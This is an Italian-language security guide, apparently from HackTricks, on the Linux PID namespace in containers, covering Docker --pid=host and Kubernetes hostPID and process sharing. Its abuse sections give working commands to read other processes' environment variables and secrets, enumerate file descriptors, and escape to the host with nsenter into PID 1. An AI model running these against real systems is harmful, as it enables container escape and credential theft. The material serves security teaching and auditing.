# Namespace PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il namespace PID controlla come vengono numerati i processi e quali processi sono visibili. Per questo un container può avere un proprio PID 1 pur non essendo una macchina reale. All'interno del namespace, il workload vede quello che sembra un albero di processi locale. Al di fuori del namespace, l'host continua a vedere i PID reali dell'host e l'intero panorama dei processi.<sup>[[3]](#references)</sup>

Dal punto di vista della sicurezza, il namespace PID è importante perché la visibilità dei processi è preziosa. Quando un workload può vedere i processi dell'host, potrebbe riuscire a osservare i nomi dei servizi, gli argomenti della riga di comando, i segreti passati come argomenti dei processi, lo stato derivato dall'ambiente tramite `/proc` e i potenziali target per l'ingresso nei namespace. Se può fare qualcosa di più che limitarsi a vedere quei processi, ad esempio inviare segnali o usare ptrace nelle condizioni appropriate, il problema diventa molto più serio.

## Funzionamento

Un nuovo namespace PID inizia con una propria numerazione interna dei processi. Il primo processo creato al suo interno diventa PID 1 dal punto di vista del namespace, il che significa anche che acquisisce semantiche speciali simili a quelle di init per i processi figli orfani e per la gestione dei segnali. Questo spiega molte stranezze dei container relative ai processi init, alla raccolta dei processi zombie e al motivo per cui a volte si usano wrapper init minimali nei container.<sup>[[3]](#references)</sup>

I namespace PID formano una gerarchia. Un processo in un namespace antenato può indirizzare i discendenti usando il PID assegnato in quel namespace, ma un discendente non può indirizzare i task visibili solo agli antenati tramite le normali syscall basate sui PID, né usare `setns()` per risalire a un namespace PID antenato. Un procfs appartenente a un antenato, esposto deliberatamente al discendente, può comunque esporre il panorama dei processi dell'antenato. Inoltre, l'uso di `setns()` per entrare in un namespace PID cambia il namespace per i **figli futuri**, non per il chiamante; per questo gli strumenti creano un processo figlio dopo essere entrati nel namespace. Un mount di procfs conserva la vista PID del processo che lo ha montato: ecco perché creare un nuovo procfs dopo `unshare(CLONE_NEWPID)` è rilevante per la sicurezza e non è solo una questione estetica.<sup>[[3]](#references)</sup>

La lezione importante per la sicurezza è che un processo può sembrare isolato perché vede solo il proprio albero di processi, ma questo isolamento può essere deliberatamente rimosso. Docker lo consente tramite `--pid=host`, mentre Kubernetes lo fa tramite `hostPID: true`. Quando il container entra nel namespace PID dell'host, il workload vede direttamente i processi dell'host e molti percorsi d'attacco successivi diventano molto più realistici.

## Laboratorio

Per creare manualmente un namespace PID:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

La shell ora vede una vista privata dei processi. Il flag `--mount-proc` è importante perché monta un'istanza di procfs che corrisponde al nuovo namespace PID, rendendo coerente l'elenco dei processi dall'interno.<sup>[[3]](#references)</sup>

Per confrontare il comportamento dei container:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

La differenza è immediata e facile da capire, ed è per questo che si tratta di un buon primo laboratorio per i lettori.

## Utilizzo a runtime

I normali container in Docker, Podman, containerd e CRI-O hanno un proprio PID namespace. I container Kubernetes normalmente hanno viste PID separate; `shareProcessNamespace: true` crea deliberatamente una vista condivisa per tutto il Pod.<sup>[[4]](#references)</sup> Al contrario, `hostPID: true` seleziona il PID namespace del nodo. Gli ambienti LXC/Incus si basano sulla stessa primitiva del kernel, anche se i casi d'uso dei system container possono esporre alberi di processi più complessi e favorire scorciatoie di debugging.

La stessa regola vale ovunque: se il runtime ha scelto di non isolare il PID namespace, si tratta di una riduzione deliberata del confine di sicurezza del container.

## Configurazioni errate

La configurazione errata più comune è la condivisione del PID host. Spesso i team la giustificano per comodità di debugging, monitoraggio o gestione dei servizi, ma dovrebbe sempre essere considerata un'eccezione di sicurezza significativa. Anche se il container non dispone di un'azione immediata di scrittura sui processi host, la sola visibilità può rivelare molte informazioni sul sistema. Quando si aggiungono capability come `CAP_SYS_PTRACE` o un accesso utile a procfs, il rischio aumenta notevolmente.

Un altro errore è supporre che la condivisione del PID host sia innocua solo perché, per impostazione predefinita, il workload non può terminare i processi host né usare ptrace su di essi. Questa conclusione ignora il valore dell'enumerazione, la disponibilità di target per l'ingresso nei namespace e il modo in cui la visibilità dei PID si combina con altri controlli indeboliti.

### Condivisione dei processi a livello di Pod Kubernetes

`shareProcessNamespace: true` è diverso da `hostPID`: espone i processi degli **altri container nello stesso Pod**, non i processi del nodo. Un sidecar compromesso o un container di debug può quindi enumerare le righe di comando e i dati d'ambiente dei container fratelli, nel rispetto dei controlli di accesso di procfs, inviare segnali quando le credenziali lo consentono e accedere al filesystem di un container fratello tramite `/proc/<pid>/root`. Kubernetes avverte esplicitamente che, in questo caso, i segreti nelle righe di comando e nell'ambiente, nonché i filesystem dei container, sono protetti solo dai permessi Unix applicabili.<sup>[[4]](#references)</sup>

Verifica utile lato cluster:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Da un container compromesso in un namespace PID a livello di Pod, verifica prima l'accesso effettivo invece di presumere che la visibilità equivalga alla leggibilità:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### Container effimeri mirati in un Pod Kubernetes esistente

Un'identità Kubernetes autorizzata a modificare `pods/ephemeralcontainers` può aggiungere un debugger a un Pod in esecuzione anche quando `shareProcessNamespace` non è impostato. Con `--target`, il debugger si unisce al namespace dei processi del container specificato, se il runtime supporta il targeting dei namespace. Questo consente di visualizzare i processi di quel container, non il namespace PID host del nodo.<sup>[[5]](#references)</sup>

L'API usa un subresource separato, quindi verifica i relativi permessi `patch`/`update` invece di presumere che i normali permessi di scrittura sui Pod siano sufficienti.<sup>[[6]](#references)</sup>

Per un Pod e un container all'interno di un namespace autorizzato, verifica la visualizzazione mirata:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

Se il runtime non implementa il targeting, il debugger potrebbe non avviarsi o rimanere in un PID namespace isolato.<sup>[[5]](#references)</sup> Se il targeting funziona, usa i controlli in [Condivisione dei processi a livello di Pod Kubernetes](#kubernetes-pod-wide-process-sharing) per verificare l'accesso a `/proc/<pid>`. La visibilità non autorizza a leggere i segreti del target o a inviargli segnali: si applicano comunque le credenziali Unix e i controlli di accesso di procfs.<sup>[[4]](#references)[[8]](#references)</sup> I Pod Security Standards pongono inoltre limiti alle impostazioni privilegiate dei container effimeri.<sup>[[7]](#references)</sup>

## Abuso

Se il namespace PID dell'host è condiviso, un attacker può ispezionare i processi dell'host, raccogliere gli argomenti dei processi, identificare servizi interessanti, individuare PID candidati per `nsenter` oppure combinare la visibilità dei processi con privilegi relativi a ptrace per interferire con i workload dell'host o di quelli adiacenti. In alcuni casi, basta vedere il processo di lunga durata giusto per riorientare il resto del piano di attacco.

Il primo passaggio pratico consiste sempre nel verificare che i processi dell'host siano davvero visibili:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Una volta visibili i PID dell'host, gli argomenti dei processi e i target di ingresso nei namespace diventano spesso la fonte di informazioni più utile:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

Se `nsenter` è disponibile e si dispone di privilegi sufficienti, verifica se un processo host visibile può essere usato come ponte di namespace:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Anche quando l'accesso è bloccato, la visibilità dei PID dell'host è già utile perché rivela la struttura dei servizi, i componenti del runtime e i processi privilegiati da prendere di mira in seguito. La sola visibilità dei PID **non** concede il permesso di inviare segnali, eseguire trace, leggere voci sensibili di `/proc/<pid>` o unirsi agli altri namespace del target; contano comunque le credenziali, la dumpability, le capability nel user namespace proprietario del namespace del target, le policy Yama/LSM e seccomp.<sup>[[3]](#references)</sup> Vedi [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) per esempi di process injection.

La visibilità dei PID dell'host rende anche più realistico l'abuso dei file descriptor. Se un processo privilegiato dell'host o un workload adiacente ha aperto un file o un socket sensibile, l'attaccante potrebbe riuscire a ispezionare `/proc/<pid>/fd/` e ad accedere all'oggetto sottostante, a seconda dei controlli di tipo ptrace, della proprietà, delle opzioni di mount di procfs, del tipo di oggetto e del modello del servizio target. Vedere un symlink FD non significa che sia possibile aprirlo, e un socket non può essere duplicato semplicemente aprendo il suo symlink `/proc/<pid>/fd/N`. Per la distinta primitiva `pidfd_getfd()` e i relativi controlli di autorizzazione, vedi [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

Questi comandi sono utili perché indicano se `hidepid=1` o `hidepid=2` riduce la visibilità tra processi e se descrittori chiaramente interessanti, come file segreti aperti, log o socket Unix, sono visibili.

### Esempio completo: PID dell'host + `nsenter`

La condivisione del PID dell'host può consentire un host escape quando il processo dispone delle capability necessarie per entrare nei namespace dell'host e adottare la root del processo dell'host. Per quest'ultima operazione è necessario `nsenter --root` (`-r`): cambiare il namespace di mount da solo non modifica la directory root del chiamante.<sup>[[9]](#references)</sup> L'accesso a `/proc/1/root` è soggetto a un controllo di lettura ptrace, mentre cambiare root richiede `CAP_SYS_CHROOT` nel namespace utente del chiamante.<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

Se il comando riesce, la nuova shell usa i namespace mount, UTS, network, IPC e PID dell'host e il filesystem root del PID 1. Verifica l'identità effettiva e i permessi di accesso, invece di presumere che la sola visibilità dei PID abbia concesso privilegi sull'host.<sup>[[9]](#references)</sup>

Anche se `nsenter` non è disponibile, è possibile ottenere lo stesso risultato usando il binario dell'host, se il filesystem dell'host è montato:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### Note recenti sui runtime

Alcuni attacchi rilevanti per i PID namespace non sono le tradizionali configurazioni errate `hostPID: true`, ma bug nell’implementazione del runtime relativi a come vengono applicate le protezioni di procfs durante la configurazione del container.

#### Race di `maskedPaths` verso procfs dell’host

Nelle versioni vulnerabili di `runc`, gli attaccanti in grado di controllare l’immagine del container o il workload `runc exec` potevano sfruttare una race durante la fase di masking, sostituendo `/dev/null` sul lato container con un symlink a un percorso procfs sensibile, come `/proc/sys/kernel/core_pattern`. Se la race riusciva, il bind mount del percorso mascherato poteva finire sul target sbagliato ed esporre al nuovo container parametri procfs globali dell’host.<sup>[[1]](#references)</sup>

Comando utile per la verifica:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

Questo è importante perché l’impatto finale può essere lo stesso di un’esposizione diretta di procfs: `core_pattern` o `sysrq-trigger` scrivibili, seguiti dall’esecuzione di codice sull’host o da un denial of service. Le pagine dedicate a [masked paths](../masked-paths.md) e [sensitive host mounts](../../sensitive-host-mounts.md) trattano la superficie di attacco generale di procfs senza ripeterla qui.

#### Iniezione di namespace con `insject`

Gli strumenti di iniezione nei namespace, come `insject`, dimostrano che interagire con un PID namespace non richiede sempre di entrare nel namespace di destinazione prima di creare il processo. Un helper può collegarsi in seguito, usare `setns()` ed eseguire mantenendo la visibilità nello spazio dei PID di destinazione:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

Questo tipo di tecnica è rilevante soprattutto per il debugging avanzato, gli strumenti offensivi e i flussi di lavoro post-exploitation, nei quali è necessario associarsi al contesto del namespace dopo che il runtime ha già inizializzato il workload.

### Pattern correlati di abuso dei FD

Vale la pena evidenziare esplicitamente due pattern quando i PID dell'host sono visibili. Primo, un processo privilegiato può mantenere aperto un file descriptor sensibile attraverso `execve()` perché non è stato contrassegnato con `O_CLOEXEC`. Secondo, i servizi possono passare file descriptor tramite socket Unix usando `SCM_RIGHTS`. In entrambi i casi, l'oggetto interessante non è più il percorso, ma l'handle già aperto che un processo con privilegi inferiori può ereditare o ricevere.

Questo è importante nel lavoro sui container perché l'handle può puntare a `docker.sock`, a un log privilegiato, a un file di segreti dell'host o a un altro oggetto di grande valore, anche quando il percorso non è direttamente raggiungibile dal filesystem del container.

## Verifiche

Lo scopo di questi comandi è determinare se il processo ha una vista privata dei PID oppure se può già enumerare un panorama di processi molto più ampio.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

Cosa c'è di interessante qui:<sup>[[3]](#references)</sup>

- Se l'elenco dei processi contiene servizi host chiaramente riconoscibili, probabilmente la condivisione dei PID dell'host è già attiva.
- Vedere solo un piccolo albero locale al container è la situazione normale; vedere `systemd`, `dockerd` o demoni non correlati non lo è.
- `NSpid` può mostrare la mappatura dei PID tra namespace annidati. Il valore più a sinistra è relativo al namespace PID associato al mount di procfs, seguito dai valori dei namespace annidati successivi.
- `readlink /proc/self/ns/pid` da solo non può dimostrare `hostPID`: anche un container isolato ha un inode valido per il namespace PID. Confrontalo con l'elenco dei processi, il mount di procfs, la configurazione del runtime e, se disponibile, un inode del namespace sul lato host.
- Quando i PID dell'host sono visibili, persino le informazioni sui processi di sola lettura diventano utili per la ricognizione.

Se scopri un container in esecuzione con la condivisione dei PID dell'host, non considerarla una differenza puramente estetica. Cambia radicalmente ciò che il workload può osservare e potenzialmente influenzare.





## References

- [1] [Avviso di sicurezza di runc: fuga dal container tramite abuso di "masked path" a causa di race condition nei mount (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Rilascio dello strumento – insject: un injector di Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Manual pages di Linux, edizione 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Condividere il Process Namespace tra i container in un Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [Eseguire il debug dei Pod in esecuzione](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [KEP sui container effimeri](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Standard di sicurezza dei Pod](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
